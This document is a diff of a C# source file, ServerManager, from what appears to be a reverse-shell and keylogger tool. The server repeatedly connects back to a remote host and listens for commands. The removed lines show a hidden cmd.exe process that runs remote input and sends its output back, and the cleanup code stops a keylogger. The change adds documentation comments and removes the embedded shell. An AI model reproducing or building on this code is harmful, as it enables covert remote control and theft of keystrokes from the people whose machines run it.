@@ -1,20 +1,19 @@
 ﻿using Commands;
 using NetworkManager;
+using Shared;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
-using System.Text;
 using System.Threading;
 
 namespace ReverseShellServer
 {
     public class ServerManager
     {
-        Process processCmd { get; set; }
-
-
+        /// <summary>
+        /// Constructor checks if another instance of the application is already running,
+        /// if there is one, close itself and let the already started one live
+        /// </summary>
         public ServerManager()
         {
             // Only one instance can run, random string identifier
@@ -26,42 +25,38 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Entry point of the server manager, indefinitely run the server method,
+        /// if the connection stops, retry after the given delay
+        /// </summary>
+        /// <param name="remoteAdress">Remote end to connect to</param>
+        /// <param name="remotePort">Remote end's port to connect to</param>
+        /// <param name="retryDelay">Time in ms to wait for between each connection attempt</param>
         public void Start(string remoteAdress, int remotePort, int retryDelay)
         {
             while (true)
             {
                 RunServer(remoteAdress, remotePort);
-                Thread.Sleep(retryDelay);           //Wait for a time and try again
+                Thread.Sleep(retryDelay);           //Wait for the given time and try again
             }
         }
 
 
+        /// <summary>
+        /// Call the ServerNetworkManager ConnectToClient method, if the connection is succesfull,
+        /// start to listen for incoming commands from the client.
+        /// </summary>
+        /// <param name="remoteAdress">Remote end to connect to</param>
+        /// <param name="remotePort">Remote end's port to connect to</param>
         void RunServer(string remoteAdress, int remotePort)
         {
             if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
             {
+                // the connection attempt wasn't successfull
                 return;
             }
 
-            processCmd = new Process
-            {
-                StartInfo =
-                {
-                    FileName = "cmd.exe",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    StandardOutputEncoding = Encoding.GetEncoding(850),
-                    RedirectStandardOutput = true,
-                    RedirectStandardInput = true,
-                    RedirectStandardError = true
-                },
-            };
-            processCmd.OutputDataReceived += CmdOutputDataHandler;
-            processCmd.Start();
-            processCmd.BeginOutputReadLine();
-
-            SayHelloToCmd();
-
+            // While there is no exception, wait for incoming data and process it
             while (true)
             {
                 try
@@ -77,6 +72,10 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Process a string that was already processed by the client sending it, so it's a valid command
+        /// </summary>
+        /// <param name="receivedData">Data sent by the client</param>
         void ProcessCommand(string receivedData)
         {
             var splittedCommand = receivedData.Split(' ').ToList();
@@ -99,57 +98,17 @@ namespace ReverseShellServer
                 {
                     StopServer();
                 }
-                SayHelloToCmd();
-            }
-            else
-            {
-                processCmd.StandardInput.WriteLine($"{receivedData}\n");
             }
         }
-
-
-        void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");
 
 
         /// <summary>
-        /// Send output to client
+        /// Close network stream and stop the key listening as well
         /// </summary>
-        /// <param name="sendingProcess"></param>
-        /// <param name="outLine"></param>
-        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            var output = outLine.Data;
-            if (string.IsNullOrEmpty(outLine.Data)) return;
-
-            try
-            {
-                // Check if the line is the one representing the path
-                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
-                {
-                    // Represents path + > + command
-                    if (output[output.Length - 1] != '>')
-                    {
-                        return;
-                    }
-
-                    // Change current working directory to the path and return
-                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
-                }
-                    
-                GlobalNetworkManager.WriteLine(output);
-            }
-            catch (Exception)
-            {
-                // ignored
-            }
-        }
-
-
         void Cleanup()
         {
             try
             {
-                processCmd.Kill();
                 MainWindow.keyLoggerManager.Stop();
                 GlobalNetworkManager.ServerNetworkManager.Cleanup();
             }
@@ -160,6 +119,9 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Exit the program
+        /// </summary>
         void StopServer()
         {
             Cleanup();
